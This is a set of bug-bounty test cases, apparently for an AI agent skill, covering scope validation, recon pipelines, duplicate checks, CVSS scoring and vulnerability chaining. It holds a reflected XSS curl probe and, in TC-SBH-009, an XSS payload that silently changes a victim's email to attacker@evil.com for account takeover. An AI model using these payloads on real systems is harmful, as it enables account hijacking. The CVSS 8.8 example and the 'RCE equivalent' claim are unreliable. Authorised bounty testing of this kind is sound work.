# Security Bounty Hunter — Test Cases

> Structured test scenarios for bounty-worthy vulnerability discovery, triage, and reporting.

---

## TC-BH-001: HackerOne Web Application Bounty

### Scenario
A public bug bounty program targets a web application with e-commerce functionality: user authentication, product catalog, shopping cart, and payment processing.

### Test Steps

1. **Scope Verification**
   - Read security policy at `/security` and HackerOne program page
   - Identify in-scope domains: `shop.target.com`, `api.target.com`
   - Note exclusions: payment gateway (third-party), DDoS, social engineering

2. **Surface Discovery**
   - Enumerate API endpoints from JavaScript bundles
   - Map authentication flows (login, register, password reset, 2FA)
   - Identify user roles (customer, admin, support)
   - Find file upload functionality (profile pictures, product images)

3. **Static Triage**
   ```bash
   semgrep --config=auto --severity=ERROR --json .
   # Filter: keep only findings with network-reachable paths
   ```

4. **Manual Trace — Priority Targets**
   - Trace user input in search parameter to SQL sink
   - Trace file upload path to code execution
   - Trace API authentication to IDOR
   - Trace webhook/URL input to SSRF

5. **PoC Development** — Build minimal safe PoC for each confirmed vulnerability

6. **Report Draft** — Use report template from payloads.md

### Expected Outcomes

| Finding | Severity | Confidence |
|---------|----------|------------|
| IDOR in user profile API | High | High |
| Stored XSS in product reviews | Medium | High |
| SSRF in webhook URL validation | Critical | Medium |

---

## TC-BH-002: Scope Validation and Duplicate Detection

### Scenario
Testing a private bug bounty program where scope boundaries are complex and many findings have already been reported.

### Test Steps

1. **Scope Boundary Testing**
   - Verify which subdomains are in scope
   - Check if API endpoints on different domains share auth
   - Identify if staging/dev environments are in scope

2. **Duplicate Detection**
   ```bash
   searchsploit [target technology]
   # Check public advisories and CVE databases
   # Review program's resolved reports for pattern matching
   ```

3. **Scope Edge Cases**
   - Third-party integrations: in scope or excluded?
   - Mobile API endpoints: same scope as web?
   - Subdomain takeover candidates: accepted?
   - Information disclosure via headers: bounty-worthy?

4. **Quality Gate Application**
   - [ ] Finding is within declared scope
   - [ ] No duplicate in existing reports
   - [ ] Vulnerability is genuinely exploitable
   - [ ] PoC demonstrates real impact
   - [ ] Report follows program's template

### Expected Outcomes
- Clear scope boundary map
- Duplicate detection checklist
- Validated findings ready for submission

---

## TC-BH-003: Open Source Responsible Disclosure

### Scenario
Discovering a security vulnerability in a popular open-source project on GitHub with no formal bug bounty program.

### Test Steps

1. **Vulnerability Discovery**
   ```bash
   git clone https://github.com/example/project
   cd project
   semgrep --config=auto --severity=ERROR --json .
   ```

2. **Exploitability Assessment**
   - Is the code path reachable from a network boundary?
   - Is user input genuinely controllable?
   - Does existing sanitization block the attack?

3. **Responsible Disclosure Process**
   - Check for SECURITY.md or security policy in repository
   - Use GitHub Security Advisory (private vulnerability reporting)
   - If no channel exists, check MAINTAINERS for contact

4. **Disclosure Timeline**
   - Day 0: Privately report to maintainers
   - Day 7: Follow up if no response
   - Day 30: Second follow up
   - Day 90: Consider public disclosure per vendor response

5. **Advisory Template**
   ```markdown
   ## [Project Name] - [Vulnerability Type]
   **Affected Versions**: < [version]
   **CVE**: CVE-XXXX-XXXXX (requested)

   ### Summary / Details / PoC / Impact / Mitigation
   ```

### Expected Outcomes
- Private security advisory submitted
- CVE requested through GitHub
- Coordinated disclosure timeline established

---

## TC-BH-004: Report Quality and Bounty Tier Assessment

### Scenario
Validating that a discovered vulnerability meets bounty program quality standards and correctly assessing severity tier.

### Test Steps

1. **Severity Assessment**
   - Map finding to CWE
   - Calculate CVSS 3.1 score
   - Cross-reference with program's severity definitions

2. **Report Quality Checklist**
   - [ ] Title is concise and descriptive
   - [ ] Vulnerable component is precisely identified
   - [ ] PoC is minimal, safe, and reproducible
   - [ ] Impact is clearly stated with business context
   - [ ] Affected version/environment is specified
   - [ ] Remediation suggestion is actionable
   - [ ] Evidence includes full request/response

3. **Bounty Tier Assessment Matrix**

   | Criteria | Critical | High | Medium | Low |
   |----------|----------|------|--------|-----|
   | Auth required | No | Yes (any user) | Yes (specific role) | Yes (admin) |
   | User interaction | None | None/Minimal | Required | Required |
   | Data impact | RCE/Mass exfil | Auth bypass | Limited data access | Info disclosure |
   | Scope | All users | Many users | Few users | Single user |

4. **Report Refinement**
   - Trim unnecessary narrative — maintainers value precision
   - Include video/screenshot evidence if applicable
   - Verify PoC works on current production version

### Expected Outcomes
- Correctly tiered vulnerability report
- Maximum eligible bounty for finding
- Fast triage by program maintainers

---

## TC-BH-005: Automated Reconnaissance Pipeline

### Objective

Validate end-to-end automated recon pipeline that discovers exploitable assets from a bounty program scope definition.

### Severity: HIGH

### Prerequisites
- Bug bounty program with wildcard scope (*.target.com)
- Subdomain enumeration tools (subfinder, amass, httpx)
- Nuclei with updated templates

### Steps

1. **Asset Discovery**
   - Run subdomain enumeration: `subfinder -d target.com -all -o subs.txt`
   - Probe live hosts: `httpx -l subs.txt -status-code -title -o live.txt`
   - Identify technologies: `httpx -l subs.txt -tech-detect -o tech.txt`

2. **Attack Surface Mapping**
   - Extract URLs from Wayback: `waybackurls target.com > wayback.txt`
   - Find JS files: `grep '\.js$' wayback.txt | sort -u > js_files.txt`
   - Extract endpoints from JS files

3. **Vulnerability Scanning**
   - Run nuclei critical/high templates against live hosts
   - Check subdomain takeover candidates
   - Test for exposed admin panels and debug endpoints

4. **Finding Validation**
   - Manually verify each nuclei finding (eliminate false positives)
   - Confirm subdomain takeover by registering/pointing resource
   - Test IDOR/auth bypass on discovered API endpoints

5. **Reporting**
   - Document full attack chain with evidence
   - Calculate CVSS score
   - Submit via appropriate platform

### Expected Output
- Discovered 50+ live subdomains from wildcard scope
- At least 3 nuclei findings confirmed manually
- At least 1 high/critical vulnerability with full PoC
- Report submitted within 48 hours of discovery

### Pass Criteria
- [ ] Subdomain enumeration covers multiple sources (DNS, CT, brute)
- [ ] Live host probing filters out non-responsive hosts
- [ ] Nuclei findings manually verified (no false positive submissions)
- [ ] At least one finding is bounty-eligible (in scope + exploitable)
- [ ] Report follows platform template with complete evidence
- [ ] Total pipeline runs in under 4 hours

### Remediation
For targets: implement asset inventory, monitor for subdomain takeover, disable unused services

---

## TC-SBH-006: Bug Bounty Scope Validation

**Objective**: Validate that scope boundary analysis correctly identifies in-scope and out-of-scope targets before testing begins, preventing wasted effort on excluded assets and avoiding policy violations that could result in disqualification.

**Severity**: HIGH

**Prerequisites**:
- Bug bounty program with documented scope (HackerOne, Bugcrowd, or private program)
- Target organization with multiple subdomains and services
- Subdomain enumeration tools (subfinder, amass)
- HTTP probing tools (httpx)

**Steps**:

1. **Parse program scope definition**
   ```bash
   # Extract declared scope from program page
   # Example scope: *.target.com (excluding admin.target.com, staging.target.com)
   # In-scope: web applications, API endpoints
   # Out-of-scope: DDoS, social engineering, third-party services, staging environments
   ```

2. **Enumerate all subdomains**
   ```bash
   subfinder -d target.com -all -o all_subs.txt
   amass enum -passive -d target.com -o amass_subs.txt
   cat all_subs.txt amass_subs.txt | sort -u > combined_subs.txt
   ```

3. **Probe live hosts**
   ```bash
   httpx -l combined_subs.txt -status-code -title -tech-detect -o live_hosts.txt
   ```

4. **Classify each live host against scope rules**
   ```bash
   # Automated scope classification
   while read -r url; do
     host=$(echo "$url" | awk -F'/' '{print $3}')
     if echo "$host" | grep -qE "admin\.|staging\."; then
       echo "OUT_OF_SCOPE: $url (excluded subdomain)"
     elif echo "$host" | grep -qE "target\.com$"; then
       echo "IN_SCOPE: $url (wildcard match)"
     else
       echo "UNCLEAR: $url (needs manual review)"
     fi
   done < live_hosts.txt > scope_classification.txt
   ```

5. **Identify scope edge cases**
   - Third-party integrations: `checkout.target.com` (payment provider) — in scope?
   - Mobile API: `api.target.com/v2/mobile/` — same scope as web API?
   - CDN origin: `origin.target.com` — behind Cloudflare but directly accessible?
   - Subdomain takeover candidates: `ghost.target.com` (CNAME to deleted GitHub Pages)

6. **Validate scope boundaries with program maintainer** (if unclear)
   - Submit scope clarification question via platform
   - Document response as authorization evidence

**Expected Result**: Scope classification document with all discovered assets categorized as IN_SCOPE, OUT_OF_SCOPE, or UNCLEAR, with evidence for each classification

**Remediation**: For program maintainers: provide clear, unambiguous scope definitions; include explicit lists of in-scope and out-ofcope domains; respond promptly to scope clarification questions

**Pass Criteria**:
- [ ] All enumerated subdomains classified against scope rules
- [ ] At least 3 scope edge cases identified and documented
- [ ] No testing performed on OUT_OF_SCOPE assets
- [ ] UNCLEAR assets resolved via platform question before testing
- [ ] Scope classification document saved as engagement evidence

---

## TC-SBH-007: Duplicate Vulnerability Detection

**Objective**: Validate that reported vulnerabilities are checked against existing reports, known CVEs, and previously resolved issues to avoid submitting duplicates that waste triage time and can result in reputation penalties.

**Severity**: MEDIUM

**Prerequisites**:
- Bug bounty program with history of resolved reports
- Discovered vulnerability with potential for duplication
- Access to platform's resolved reports (if available)
- CVE database access (NVD, MITRE)

**Steps**:

1. **Document the finding before checking for duplicates**
   ```bash
   # Record finding details
   echo "Finding: Reflected XSS in search parameter"
   echo "Endpoint: https://shop.target.com/search?q=<payload>"
   echo "CWE: CWE-79"
   echo "CVSS: 6.1 (Medium)"
   ```

2. **Check platform resolved reports**
   - Search platform for: "XSS", "cross-site scripting", "search", "reflected"
   - Review each resolved report for same endpoint and parameter
   - Check report resolution date — was the fix deployed?

3. **Check CVE databases for same technology**
   ```bash
   # If target uses specific technology (e.g., WordPress plugin)
   searchsploit "plugin-name xss"
   curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=target+technology+xss" | jq '.vulnerabilities[].cve.id'
   ```

4. **Test if the vulnerability still exists (fix verification)**
   ```bash
   # If resolved report exists, test if fix actually works
   curl -s "https://shop.target.com/search?q=<script>alert(1)</script>" | \
     grep -i "alert(1)" && echo "VULNERABILITY STILL PRESENT (not duplicate)" || \
     echo "FIXED (do not report)"
   ```

5. **Analyze for subtle differences from existing reports**
   - Same endpoint but different parameter? (may be a new finding)
   - Same vulnerability type but different bypass technique? (may be a new finding)
   - Same root cause but different exploit path? (document as variant, may be eligible)
   - Identical finding with identical exploit path? (definite duplicate — do not submit)

6. **Document duplication analysis result**
   ```markdown
   ## Duplication Analysis
   - Platform search: 3 XSS reports found, none on /search endpoint
   - CVE check: no known CVE for this specific parameter
   - Fix verification: vulnerability still present
   - Conclusion: NOT A DUPLICATE — safe to report
   ```

**Expected Result**: Duplication analysis report with clear verdict (DUPLICATE, NOT_DUPLICATE, or VARIANT), supporting evidence, and recommendation on whether to submit

**Remediation**: For program maintainers: maintain a public list of known/reported issues to help hunters avoid duplicates; for hunters: always check before submitting

**Pass Criteria**:
- [ ] Platform resolved reports searched with relevant keywords
- [ ] CVE databases checked for same technology and vulnerability type
- [ ] Vulnerability verified as still present (not previously fixed)
- [ ] Finding compared against existing reports for endpoint and parameter match
- [ ] Clear verdict (DUPLICATE / NOT_DUPLICATE / VARIANT) with supporting evidence
- [ ] If VARIANT: documented how it differs from existing report

---

## TC-SBH-008: Severity Assessment for Triage

**Objective**: Validate that vulnerability severity is assessed accurately using CVSS 3.1 scoring, aligned with the bounty program's severity definitions, and includes business impact context to justify the assigned tier for fast triage.

**Severity**: MEDIUM

**Prerequisites**:
- Confirmed vulnerability with reproduction steps
- Target's business context understood (user base, data handled, revenue impact)
- CVSS 3.1 calculator available
- Program's severity tier definitions reviewed

**Steps**:

1. **Map finding to CWE**
   ```bash
   # Identify the CWE
   # Example: SQL Injection → CWE-89
   # Example: XSS → CWE-79
   # Example: IDOR → CWE-639
   # Example: SSRF → CWE-918
   ```

2. **Calculate CVSS 3.1 score**
   ```bash
   # Use CVSS calculator for the finding
   # Example: Authenticated SQL Injection extracting user data
   # Attack Vector (AV): Network (exploitable remotely)
   # Attack Complexity (AC): Low (simple payload)
   # Privileges Required (PR): Low (any authenticated user)
   # User Interaction (UI): None
   # Scope (S): Unchanged
   # Confidentiality (C): High (full database access)
   # Integrity (I): High (can modify database)
   # Availability (A): Low (can cause limited disruption)
   # CVSS Score: 8.8 (High)
   ```

3. **Cross-reference with program severity definitions**
   ```markdown
   Program tier definitions:
   - Critical: RCE, full database access, auth bypass without credentials
   - High: significant data access, auth bypass with credentials, SSRF with impact
   - Medium: limited data access, self-XSS, CSRF on important actions
   - Low: information disclosure, reflected XSS with user interaction

   Our finding: SQLi with full database read → maps to Critical tier
   ```

4. **Assess business impact**
   ```bash
   # Document business context
   echo "Business Impact Assessment:"
   echo "- User accounts affected: estimated 100,000+"
   echo "- Data exposed: email, hashed password, address, phone"
   echo "- Financial impact: credential stuffing → account takeover → financial loss"
   echo "- Regulatory impact: GDPR Article 32 violation, potential breach notification"
   echo "- Reputation impact: public disclosure would damage trust"
   ```

5. **Compare CVSS score to program tier**
   ```
   CVSS Score: 8.8 (High)
   Program tier for this finding: Critical (full database access)
   Recommendation: submit as Critical with justification
   Note: CVSS and program tier may differ — always align with program definitions
   ```

6. **Draft severity justification for report**
   ```markdown
   ## Severity Justification

   **CVSS 3.1 Score**: 8.8 (High)
   **CWE**: CWE-89 (SQL Injection)
   **Program Tier**: Critical

   **Justification for Critical tier**:
   - Full database read access confirmed (SELECT queries return all rows)
   - Database contains 100,000+ user records with PII
   - Any authenticated user can exploit (low privilege requirement)
   - No user interaction required
   - Regulatory implications (GDPR breach if exploited)
   - Aligns with program's Critical definition: "full database access"
   ```

**Expected Result**: Severity assessment with CVSS score, CWE mapping, program tier alignment, business impact analysis, and justification for the assigned tier

**Remediation**: For program maintainers: provide clear severity definitions with examples; for hunters: always include severity justification with CVSS score and business impact

**Pass Criteria**:
- [ ] CWE mapping identified and documented
- [ ] CVSS 3.1 score calculated with all vector components
- [ ] Score cross-referenced with program's severity tier definitions
- [ ] Business impact analysis included (user count, data types, regulatory implications)
- [ ] Severity justification explains any discrepancy between CVSS and program tier
- [ ] Report includes severity section ready for triage reviewer

---

## TC-SBH-009: Vulnerability Chain Construction for Maximum Impact

**Objective**: Validate that multiple lower-severity findings can be chained together to demonstrate a higher-severity impact, increasing the bounty payout and providing the vendor with a realistic attack narrative.

**Severity**: HIGH

**Prerequisites**:
- Two or more confirmed vulnerabilities on the same target
- Understanding of the application's authentication and authorization model
- Ability to demonstrate each vulnerability independently
- Access to the bounty program's payout matrix

**Steps**:

1. **Inventory all confirmed findings**
   ```markdown
   ## Finding Inventory
   - F1: Reflected XSS in search parameter (Medium, CWE-79)
   - F2: CSRF on email change endpoint (Medium, CWE-352)
   - F3: IDOR in /api/v1/users/{id}/profile (High, CWE-639)
   - F4: Open redirect on /login?redirect= (Low, CWE-601)
   ```

2. **Identify potential chains**
   ```bash
   # Map data flow between vulnerabilities
   # Chain 1: Open Redirect → Phishing → Credential Capture → IDOR
   # Chain 2: CSRF → Admin email change → Account takeover → Full data access
   # Chain 3: XSS → Cookie theft → Authenticated session → IDOR data exfiltration
   ```

3. **Build the exploit chain**
   ```python
   #!/usr/bin/env python3
   """Chain PoC: XSS + CSRF → Full Account Takeover"""
   import requests

   # Step 1: XSS payload that auto-triggers CSRF
   xss_payload = """
   <script>
   fetch('/api/v1/account/email', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({email: 'attacker@evil.com'}),
     credentials: 'include'
   });
   </script>
   """

   # Step 2: Demonstrate the chained impact
   # - Victim visits page with reflected XSS
   # - XSS auto-triggers CSRF to change victim email
   # - Attacker triggers password reset on the new email
   # - Attacker gains full account access
   # - From compromised account, IDOR exposes other users' PII

   print("Chain impact: Unauthenticated → Full account takeover → Mass PII exposure")
   ```

4. **Document the chain with a visual attack flow**
   ```markdown
   ## Attack Chain Narrative

   1. Attacker crafts URL with XSS payload: https://target.com/search?q=<XSS>
   2. Victim clicks link; XSS executes in their browser session
   3. XSS payload sends CSRF request to change account email
   4. Attacker receives confirmation at attacker@evil.com
   5. Attacker triggers password reset → full account takeover
   6. Using compromised account, attacker exploits IDOR to access other users' PII
   7. Total impact: Unauthenticated RCE chain equivalent

   **Combined Severity**: CRITICAL (upgraded from Medium + Medium + High)
   ```

5. **Submit as a single chain report with independent findings as supplements**
   - Lead report: The complete chain with CRITICAL severity
   - Supplementary: Each individual finding can be reported separately if the chain is disputed
   - Many programs pay the higher bounty for chained findings

**Expected Result**: Complete attack chain documentation showing how individual findings combine to achieve critical impact, with a working PoC that demonstrates the full chain

**Remediation**: For program maintainers: evaluate findings in the context of attack chains, not just individual severity; a fix for any link in the chain breaks the full exploit

**Pass Criteria**:
- [ ] At least two confirmed findings identified as chainable
- [ ] Working PoC demonstrates the complete chain from start to finish
- [ ] Visual attack flow diagram or narrative included in report
- [ ] Combined severity correctly assessed and justified
- [ ] Individual findings documented as backup if chain is disputed
- [ ] Chain report submitted as primary, individual findings as supplements

---

## TC-SBH-010: Live Target Monitoring and Re-Testing

**Objective**: Validate that a monitoring and re-testing pipeline correctly identifies new attack surfaces, patches of previously reported vulnerabilities, and regressions in deployed applications. Continuous monitoring maximizes long-term bounty earnings.

**Severity**: MEDIUM

**Prerequisites**:
- Bug bounty program with an active development cycle
- Previously submitted reports with known affected endpoints
- Subdomain enumeration baseline from prior recon
- Automated notification system (webhooks, cron jobs, or CI/CD)

**Steps**:

1. **Establish a baseline inventory**
   ```bash
   # Save current attack surface as baseline
   subfinder -d target.com -all -silent | sort -u > baselines/subs_$(date +%Y%m%d).txt
   httpx -l baselines/subs_$(date +%Y%m%d).txt -json -o baselines/live_$(date +%Y%m%d).json
   nuclei -l baselines/live_$(date +%Y%m%d).json -t /Templates/ -o baselines/nuclei_$(date +%Y%m%d).txt
   ```

2. **Set up automated diff detection**
   ```bash
   #!/bin/bash
   # recon-monitor.sh — Run weekly via cron
   TODAY=$(date +%Y%m%d)
   LAST=$(ls -t baselines/subs_*.txt | head -1 | grep -oP '\d{8}')

   # Subdomain diff
   subfinder -d target.com -all -silent | sort -u > "/tmp/subs_${TODAY}.txt"
   NEW_SUBS=$(comm -13 "baselines/subs_${LAST}.txt" "/tmp/subs_${TODAY}.txt")

   if [ -n "$NEW_SUBS" ]; then
     echo "[NEW SUBDOMAINS DETECTED]" >> monitoring_log.txt
     echo "$NEW_SUBS" >> monitoring_log.txt
     httpx -l <(echo "$NEW_SUBS") -title -tech-detect -status-code >> new_assets.txt
   fi
   ```

3. **Monitor technology changes on known assets**
   ```bash
   # Detect technology stack changes (new framework = new bugs)
   httpx -l baselines/subs_latest.txt -tech-detect -json | \
     jq -r '.url + " | " + (.tech // [] | join(", "))' > "/tmp/tech_${TODAY}.txt"

   diff <(cut -d'|' -f2 baselines/tech_latest.txt | sort) \
        <(cut -d'|' -f2 "/tmp/tech_${TODAY}.txt" | sort) | \
     grep "^>" && echo "[TECHNOLOGY CHANGE DETECTED]"
   ```

4. **Re-test previously reported endpoints for regressions**
   ```bash
   # For each previously reported finding, test if it was properly fixed
   while read -r endpoint payload expected; do
     result=$(curl -s "https://target.com${endpoint}${payload}" | grep -c "error_pattern")
     if [ "$result" -gt 0 ]; then
       echo "[REGRESSION] $endpoint — previously fixed, now vulnerable again"
     fi
   done < previously_reported.txt
   ```

5. **Alert and prioritize new targets**
   ```bash
   # Notify on new attack surface discoveries
   if [ -s new_assets.txt ]; then
     # Send notification (adapt to your preferred method)
     echo "New assets found: $(wc -l < new_assets.txt)" >> alerts.log
     # Prioritize: new subdomains with admin/debug patterns get tested first
     grep -iE "admin|debug|staging|dev|internal|api" new_assets.txt >> priority_targets.txt
   fi
   ```

**Expected Result**: Automated monitoring pipeline that detects new subdomains, technology changes, endpoint additions, and regression vulnerabilities within 7 days of deployment

**Remediation**: For program maintainers: publish a changelog or version endpoint so hunters can track updates; for hunters: always re-test after major version updates

**Pass Criteria**:
- [ ] Baseline inventory saved with timestamp for comparison
- [ ] Automated diff detection runs on a regular schedule (weekly minimum)
- [ ] New subdomains trigger immediate probing and technology fingerprinting
- [ ] Previously reported endpoints re-tested for regressions after updates
- [ ] Priority classification applied to new assets (admin/internal/debug get tested first)
- [ ] Alerting mechanism notifies hunter of new opportunities without manual checking
